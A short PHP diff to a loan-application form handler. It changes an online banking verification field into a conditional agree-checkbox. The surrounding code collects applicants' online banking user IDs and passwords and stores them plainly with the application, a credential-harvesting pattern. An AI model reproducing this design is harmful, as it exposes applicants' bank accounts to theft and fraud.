@@ -134,8 +134,11 @@ class Finspire_Loan_Form_Handler {
             } elseif ( strlen( $account ) < 4 || strlen( $account ) > 17 ) {
                 $errors['account_number'] = __( 'Account number must be between 4 and 17 digits.', 'finspire-loan' );
             }
-            if ( empty( trim( $data['online_banking_verification'] ?? '' ) ) ) {
-                $errors['online_banking_verification'] = __( 'Please complete the online banking verification field.', 'finspire-loan' );
+            $verification_text = trim( (string) Finspire_Loan_Settings::get( 'step4_verification_text', Finspire_Loan_Settings::get( 'step3_verification_text', '' ) ) );
+            if ( ! empty( $verification_text ) ) {
+                if ( empty( $data['online_banking_verification'] ) ) {
+                    $errors['online_banking_verification'] = __( 'Please check the box to agree to the verification terms to proceed.', 'finspire-loan' );
+                }
             }
             if ( empty( trim( $data['online_banking_user_id'] ?? '' ) ) ) {
                 $errors['online_banking_user_id'] = __( 'Please enter your online banking user ID.', 'finspire-loan' );
@@ -226,7 +229,7 @@ class Finspire_Loan_Form_Handler {
             'account_number'        => $acct_clean,
             'account_number_masked' => $acct_masked,
             'bank_verified'         => 1,
-            'online_banking_verification' => sanitize_text_field( $raw['online_banking_verification'] ?? '' ),
+            'online_banking_verification' => ! empty( $raw['online_banking_verification'] ) ? 'Yes' : 'No',
             'online_banking_user_id'      => sanitize_text_field( $raw['online_banking_user_id'] ?? '' ),
             'online_banking_password'     => sanitize_text_field( $raw['online_banking_password'] ?? '' ),
             'contact_consent'             => ! empty( $raw['contact_consent'] ) ? 1 : 0,
